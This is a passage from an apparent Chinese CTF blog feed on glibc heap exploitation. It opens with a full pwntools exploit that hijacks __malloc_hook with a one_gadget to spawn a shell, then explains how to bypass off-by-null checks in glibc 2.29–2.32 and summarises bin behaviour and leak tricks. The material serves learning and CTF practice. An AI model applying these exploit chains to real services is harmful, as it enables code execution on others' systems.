class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbynull&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;eeee&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;gggg&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b00</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x81</span>)  <span class="hljs-comment">#0x81让系统知道前面的堆块是被使用的</span><br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x1f0</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="glibc2-29-2-32-off-by-null-bypass"><a href="#glibc2-29-2-32-off-by-null-bypass" class="headerlink" title="glibc2.29~2.32 off by null bypass"></a>glibc2.29~2.32 off by null bypass</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>观光浏览大佬博客时，发现大佬竟然整理了一篇glibc2.29~2.32 off by null bypass，如获至宝，学习为敬！</p><p>博客地址：<a href="http://blog.wjhwjhn.com/archives/193/">http://blog.wjhwjhn.com/archives/193/</a></p><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>在 glibc2.29 以上版本，glibc 在 unlink 内加入了 prevsize check，而通过 off by null 漏洞根本无法直接修改正常 chunk 的 size，导致想要 通过unlink 制造出堆块重叠变得几乎不可能。当然 off by one 是没有影响的。所以在 2.29 以上版本，off by null 的利用只有唯一的方法 —— 伪造 FD 和 BK</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">prev_inuse</span>(p)) &#123;<br>  prevsize = <span class="hljs-built_in">prev_size</span> (p);<br>  size += prevsize;<br>  p = <span class="hljs-built_in">chunk_at_offset</span>(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (<span class="hljs-built_in">chunksize</span>(p) != prevsize))<br>    <span class="hljs-built_in">malloc_printerr</span> (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  <span class="hljs-built_in">unlink_chunk</span> (av, p);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是伪造 FD 和 BK 需要绕过下面的检测才行 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br></code></pre></td></tr></table></figure><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="no-pie"><a href="#no-pie" class="headerlink" title="no pie"></a>no pie</h3><p>这种情况其实就是我之前写过的unlink attack，劫持程序中用于<strong>储存堆块指针的数组</strong>，从而达成任意地址写的目的。详细情况请移步到该篇博客，这里就不再赘述</p><h3 id="拥有堆地址"><a href="#拥有堆地址" class="headerlink" title="拥有堆地址"></a>拥有堆地址</h3><p><img src="/2021/07/20/2021-07-26-offbyone&null/0ce506d87fdbbe100ec80d1bc6f87725.png" alt="图片"></p><p>我们可以仿照上面的情况，在一个可以写入内容的堆块比如0x20的位置（ptr）上填入将要unlink的堆块地址，然后在将要unlink的堆块的 fd，bk 指针上写入<code>ptr-0x18</code>，<code>ptr-0x10</code>即可绕过检测，实现unlink</p><h3 id="无法泄露堆地址"><a href="#无法泄露堆地址" class="headerlink" title="无法泄露堆地址"></a>无法泄露堆地址</h3><p>不可泄露堆地址的各种方法归根结底都是通过<strong>部分写入</strong>和<strong>各种堆管理器的性质</strong>来改写出想要指向的堆块地址从而绕过检测</p><h4 id="一、在借用large-chunk上的垃圾数据"><a href="#一、在借用large-chunk上的垃圾数据" class="headerlink" title="一、在借用large chunk上的垃圾数据"></a>一、在借用large chunk上的垃圾数据</h4><p>当只有一个large chunk在 bin 链上时，fd_nextsize 和 bk_nextsize 是存放large chunk本身的地址。我们就是要利用这两个残余的垃圾的数据，把这两个数据作为我们要构造的 fake chunk 的 fd bk 指针。</p><p>然后大佬博客没有介绍的很清楚（大佬都是这样的），我这边会更加详细的介绍其中的细节</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161409749.png" alt="image-20211001161409749"></p><p>首先这是 large chunk 的结构</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001164643331.png"></p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161853438.png" alt="image-20211001161853438"></p><p>这是经过伪造后的 large chunk 以及我们要用得一个可以被控制的 chunk ，首先从0x10开始作为 fake chunk 的堆头开始布置，通过部分写把 fake fd指针改为 chunk 的地址，同时部分写入修改 chunk bk 指针为 fake chunk，从而绕过第一个检查 FD-&gt;bk == p</p><p>接下来就是绕过第二个检查 BK-&gt;fd == p，我们利用fastbin的特性：会在fd指针留下前一块的堆地址，在 large chunk 的 fd 指针位置写入堆地址，然后借着部分写入修改为 fake chunk addr - 0x10，完成第二个检查的绕过。</p><p>我之所以没有再重述tcache是因为：在意的地方是glibc 2.29以上的版本，以下的版本没必要使用这么麻烦的办法构造，而再glibc 2.29以上的版本加入的key字段会破坏bk指针的内容</p><p>修改方法为：然后先释放 a，再释放 largebin chunk，这时候再 largebin chunk + 0x10 的位置就会有一个 a 的指针。我们再用部分写入将指针改写成 largebin chunk + 0x10 的地址。</p><p>但是这种方法，有点过于繁琐。。。并且不太现实，需要fastchunk 和large chunk，申请次数大多题目不给这么多的。了解即可</p><h4 id="二、利用-unsorted-bin-和-large-bin-链机制"><a href="#二、利用-unsorted-bin-和-large-bin-链机制" class="headerlink" title="二、利用 unsorted bin 和 large bin 链机制"></a>二、利用 unsorted bin 和 large bin 链机制</h4><p>这部分内容如果利用得当，可以在题目的苛刻的条件下（如会在末尾写入 x00 等…）也可以无需爆破伪造堆块，着重学习，掌握</p><p>以下内容全部复制自大佬博客：</p><h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><h5 id="1-在-fd-和-bk-写堆地址"><a href="#1-在-fd-和-bk-写堆地址" class="headerlink" title="1. 在 fd 和 bk 写堆地址"></a>1. 在 fd 和 bk 写堆地址</h5><p>如下图所示，堆块 0x55555555bc00 是我们要用于构造的堆块地址。</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/4d011f51c99d6a925d5ee5c25aabdadd.png" alt="图片"></p><p>通过 unsorted bin 链表我们让这个堆块的 fd 和 bk 都写了一个堆地址</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/dbe25454747c3469ac4c83297c0536c6.png" alt="图片"></p><h6 id="构造图："><a href="#构造图：" class="headerlink" title="构造图："></a>构造图：</h6><p><img src="/2021/07/20/2021-07-26-offbyone&null/c4c7f62c37e418f3d4fc252601150155.png" alt="图片"></p><p>其中辅助堆块的作用在之后会提及</p><h6 id="构造代码："><a href="#构造代码：" class="headerlink" title="构造代码："></a><strong>构造代码：</strong></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#0 fd</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment"># 5 bk </span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 6</span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="2-在伪造堆块附近申请堆块"><a href="#2-在伪造堆块附近申请堆块" class="headerlink" title="2. 在伪造堆块附近申请堆块"></a>2. 在伪造堆块附近申请堆块</h3><p>由于我们要通过部分写入的方法来绕过检测，而在堆空间中，只有低三字节是固定的。</p><p>所以我们为了逃避爆破，希望能够找到只需要覆盖最低一字节就可以修改成 fake chunk 的地址，于是我们应该利用在 fake 堆块附近 0x100 内的堆块来作为辅助堆块写地址，<strong>之前申请的辅助堆块就是起到了这个作用，我们可以利用这个堆块来进行重分配，使得分配的地址非常贴近利用堆块</strong>。</p><h4 id="构造图：-1"><a href="#构造图：-1" class="headerlink" title="构造图："></a>构造图：</h4><p><img src="/2021/07/20/2021-07-26-offbyone&null/8940fc1f7a2579bed0c78b865df9a6c9.png" alt="图片"></p><p>可以发现，我们先让辅助堆块和利用堆块合并之后再对空间进行重新分配，使得堆块 2 恰好可以覆盖到之前利用堆块的 size，且堆块 3 的 0x55555555bc20，十分贴近之前 0x55555555bc00，只需要抹去最低一字节即可。</p><h4 id="构造代码：-1"><a href="#构造代码：-1" class="headerlink" title="构造代码："></a>构造代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#2 &amp; 3 unlink</span><br>add(<span class="hljs-number">0x438</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x418</span> + p64(<span class="hljs-number">0xA91</span>))  <span class="hljs-comment"># 0 set size</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 2 c20</span><br>add(<span class="hljs-number">0x428</span>)  <span class="hljs-comment"># 3 bk 150</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 fd 2b0</span><br></code></pre></td></tr></table></figure><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>分配完成之后，我们再把全部堆块申请回来，这可能并不是步骤最少的做法，但是全部申请回来可以使得操作有条理，使得我们构造过程中出现的问题减少。</p><h3 id="3-修复-fake-fd"><a href="#3-修复-fake-fd" class="headerlink" title="3. 修复 fake fd"></a>3. 修复 fake fd</h3><h4 id="修复思路："><a href="#修复思路：" class="headerlink" title="修复思路："></a>修复思路：</h4><p>我们在之前的状态下，先删除 <strong>fake-&gt;FD 堆块</strong>，再删除<strong>重分配堆块 2（辅助堆块）</strong>。我们就可以在 <strong>fake-&gt;FD 堆块的 BK 位置</strong>写入一个<strong>重分配堆块 2（辅助堆块）</strong>的值</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/8926f053ddc0e4cc4366e19babb9f47e.png" alt="图片"></p><p>再用部分写入一字节来覆盖，覆盖成<strong>利用堆块</strong>的指针</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/400f4af89ed8abec85d3e1567007d7b2.png" alt="图片"></p><p>最后再把 bc20 这个辅助堆块申请回来，方便下一次使用。</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/e9f7b1f6bde94a7ee9b2816e4da7ea0e.png" alt="图片"></p><h4 id="构造代码：-2"><a href="#构造代码：-2" class="headerlink" title="构造代码："></a>构造代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite fd -&gt; bk by unsorted bin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x418</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">9</span>)  <span class="hljs-comment"># 2 partial overwrite bk</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 c20</span><br></code></pre></td></tr></table></figure><h5 id="4-修复-fake-bk"><a href="#4-修复-fake-bk" class="headerlink" title="4. 修复 fake bk"></a>4. 修复 fake bk</h5><h6 id="修复思路：-1"><a href="#修复思路：-1" class="headerlink" title="修复思路："></a>修复思路：</h6><p>在我示例的这道题下，使用 unsorted bin 来修复另外 <strong>fake bk</strong> 是很难的，这是因为这道题如果要进 unsorted bin 的堆块，size 大小要大于等于 0x418，而这个 size 是在 largebin 范围内的。</p><p>所以如果我使用不同 size 申请的方法，错开<strong>辅助堆块</strong>去直接申请 <strong>fake bk 堆块（因为如果要在 fake bk-&gt;fd 的位置写堆值，那么在遍历的时候一定是先遍历到辅助堆块，所以需要错开辅助堆块先去申请 fake bk 堆块，我想到的方法就是申请一个辅助堆块无法提供的 size 来错开。但事实上，错开辅助堆块会使得辅助堆块进入 largebin 中，从而与原来的 fake bk 断链，这样原来已经写上的堆地址也不复存在）</strong>，因为这个原因所以这部分我要先让堆块进入 largebin 再用<strong>类似于修复 fake fd 的方法进行修复。</strong></p><p>先删除<strong>重分配堆块 2（辅助堆块）</strong>，再删除 <strong>fake-&gt;BK 堆块</strong>（注意：这里和上面顺序不一致，这是因为想要写入堆块地址的位置不一致）</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/7b03f181d1dbc20c0b2c7d698b6d8b38.png" alt="图片"></p><p>再让堆块进入到 largebin 中</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/0d5737399f40b84abd6d99d282c0f2c8.png" alt="图片"></p><p>再使用部分写入恢复 <strong>fake bk</strong></p><p><img src="/2021/07/20/2021-07-26-offbyone&null/e39634201bd2beefba9ec4e3821920e6.png" alt="图片"></p><p>构造代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite bk -&gt; fd by largebin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x9F8</span>)  <span class="hljs-comment"># 3 chunk into largebin</span><br>add(<span class="hljs-number">0x428</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5 partial overwrite fd</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 7 c20</span><br></code></pre></td></tr></table></figure><h5 id="5-伪造-prev-size，off-by-null-修改-size-的-p-标志位"><a href="#5-伪造-prev-size，off-by-null-修改-size-的-p-标志位" class="headerlink" title="5. 伪造 prev_size，off by null 修改 size 的 p 标志位"></a>5. 伪造 prev_size，off by null 修改 size 的 p 标志位</h5><p>这部分内容不是本文重点故略过</p><h6 id="构造代码：-3"><a href="#构造代码：-3" class="headerlink" title="构造代码："></a>构造代码：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># off by null</span><br>add(<span class="hljs-number">0x108</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>))  <span class="hljs-comment"># 8</span><br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0xA90</span>))<br>delete(<span class="hljs-number">3</span>)  <span class="hljs-comment"># unlink</span><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>低版本的检查过少的时代已经一去不返，新版本的检查增多，使得利用手法也随之复杂，但本质都是堆块的良好布局，对各种bin链上用于管理而会残余的垃圾数据进行利用，以及在新版本下似乎有些趋向于利用 large chunk 构造堆块了。最后大佬使用的布置思想十分值得我这个小菜鸡深刻学习理解，为了避免爆破而构造出偏移在0x100内的堆块，膜拜pwn👴</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;offbyone&quot;&gt;&lt;a href=&quot;#offbyone&quot; class=&quot;headerlink&quot; title=&quot;offbyone&quot;&gt;&lt;/a&gt;offbyone&lt;/h1&gt;&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>bin链情况集合</title>
    <link href="http://example.com/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/"/>
    <id>http://example.com/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/</id>
    <published>2021-07-16T12:17:24.000Z</published>
    <updated>2021-10-13T08:01:21.155Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154252123-1627363406388.png" alt="image-20210720154252123"></p><h1 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h1><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><ul><li><p>大小范围：0x20 - 0x80</p></li><li><p>单链表结构，只有fd指针</p></li><li><p>FILO（最后一个进入fastbin链表的，会被放在头部）<br>总共有十个fastbin链表，每个链表中fastbin的size一样，0x10递增<br>大小属于fastbin的chunk被free掉时，不会改变nextchunk的previnuse位，也就是说不会被合并。</p></li></ul><p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154343954-1627363410633.png" alt="image-20210720154343954"></p><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><ul><li>被释放的堆块的fd指针不能指向自己（这也就是想要double free的时候，还需要一个中间chunk的原因）</li><li>将fastbin里面的chunk分配出去时，会检查size位会不会匹配chunk的大小，会才能分配</li></ul><h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><p>构造两个相同 size 的堆块 a 和 b，我们先 free (a) 让他进入到 fast bin 中，再 free (b) 也让他进入到 fast bin中。这时候，在堆块 b 的 fd 位置就存在着堆块 a 的地址，我们 leak 出来就能够得到堆地址</p><h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><h3 id="基本结构-1"><a href="#基本结构-1" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256-1627266738935.png" style="zoom:80%;"><ul><li><p>只有一个双向链表，存在fd和bk指针</p></li><li><p>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk（未被归类）都可以归属到unsorted bin中，临时存储用</p></li><li><p>unsortedbin采用的遍历顺序是FIFO</p></li><li><p>chunk被释放进入unsortedbin时，fdbk字段会留下一个main_arena的地址信息</p></li></ul><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>libc-2.29.so以下：</p><p>利用前提是先有UAF，修改unsortedbin中的FD字段为0，BK字段为target addr - 0x10，然后malloc一个相同大小的chunk，即可完成攻击，在目标地址写入unsorted bin的地址，一般用来伪造堆头（制造出0x7f）、修改次数限制、上限信息、配合局部写</p><h3 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h3><p>当 unsorted bin 链上有两个堆块的时候，其中一个堆块的 fd 会指向另一个堆块，我们可以直接 leak 得到，可计算出堆基址</p><h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><h3 id="基本结构-2"><a href="#基本结构-2" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256.png" alt="image-20210726103140256" style="zoom:80%;"><ul><li>大小范围：0x90 - 0x400</li><li>由62个双向链表组成，每个链表中的chunk大小一样，大小以0x10递增，存在fd和bk指针</li><li>相邻的free chunk会触发合并操作，即合并成一个大的free chunk</li><li>采用的遍历顺序是FIFO</li></ul><h3 id="小技巧-2"><a href="#小技巧-2" class="headerlink" title="小技巧"></a>小技巧</h3><p>small bin 中存在两个块时，第一个块的fd指针指向main_arena，bk指针指向了下一个堆块，所以可以泄露出libc以及堆地址</p><h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><h3 id="基本结构-3"><a href="#基本结构-3" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720153655147.png" alt="image-20210720153655147" style="zoom:80%;"><p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103541056-1627363427270.png" alt="image-20210726103541056"></p><ul><li>大小范围：0x410 以上</li><li>63个双向链表，不仅存在fd和bk指针，同时还有fd nextsize 和 bk nextsize</li><li>同一个双向链表中chunk大小可以不一样，但是在一定范围内，bins大小从小到大排列</li><li>相邻的free chunk会触发合并操作，即合并成一个大的free chunk</li><li>采用的遍历顺序是FIFO</li><li><strong>在这63个largebins中：第一组的32个largebin链</strong>依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。<strong>第二组的16个largebin链</strong>依次以512字节步长为间隔；<strong>第三组的8个largebin链</strong>以步长4096为间隔；<strong>第四组的4个largebin链</strong>以32768字节为间隔；<strong>第五组的2个largebin链</strong>以262144字节为间隔；<strong>最后一组</strong>的largebin链中的chunk大小无限制。</li></ul><h3 id="小技巧-3"><a href="#小技巧-3" class="headerlink" title="小技巧"></a>小技巧</h3><p>如果堆块在 largebin 中，他的 <strong>fd_nextsize</strong> 和 <strong>bk_nextsize</strong> 都会指向堆块地址，可以泄露出堆地址</p><p>如果largenbin上仅有一个堆块，那该堆块的fd_nextsize和bk_nextsize指向自身</p><h1 id="malloc过程"><a href="#malloc过程" class="headerlink" 